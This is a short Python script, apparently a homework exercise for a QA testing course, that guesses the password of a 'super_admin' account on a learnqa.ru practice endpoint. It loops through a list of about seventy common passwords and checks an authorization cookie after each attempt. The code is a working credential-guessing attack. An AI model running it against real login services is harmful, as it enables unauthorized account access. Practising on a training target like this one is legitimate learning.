import requests

passwords = {'qwerty123', 'flower', 'hellocharlie', 'login', 'whatever', '1234567', '12345678', 'princess', 'mustang', 'loginsunshine', 'baseball', '654321', 'loveme', 'abc123', 'michael', 'lovely', '666666', 'zaq1zaq1qazwsx', '555555', 'donald', 'passw0rd654321', 'iloveyou', 'qwertyuiop', '1234567890', '123qwe', 'monkey', '121212', 'adobe123[a]', 'admin', 'batman', 'shadow', 'aa123456', 'jesus', '888888', '000000', '12345', 'football', 'solo', 'access', '123456', 'master', 'qazwsx', '7777777', 'sunshine', 'welcome', 'photoshop[a]', '1q2w3e4r', 'adminabc123', 'starwars', '!@#$%^&*', 'trustno1', 'ninja', '1qaz2wsx', 'ashley', 'bailey', '123456789', 'password', 'qwerty', '111111', 'dragon', '696969', 'letmein', '123123', 'password1', 'superman', 'hottie', 'Football', 'freedom', 'passw0rd', '1234', 'azerty'}


for i in passwords:
    payload = {"login": "super_admin", "password": i}
    r = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", params=payload)
    r2 = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies=r.cookies)
    if r2.text == "You are authorized":
        print("Password is ", i)
        break
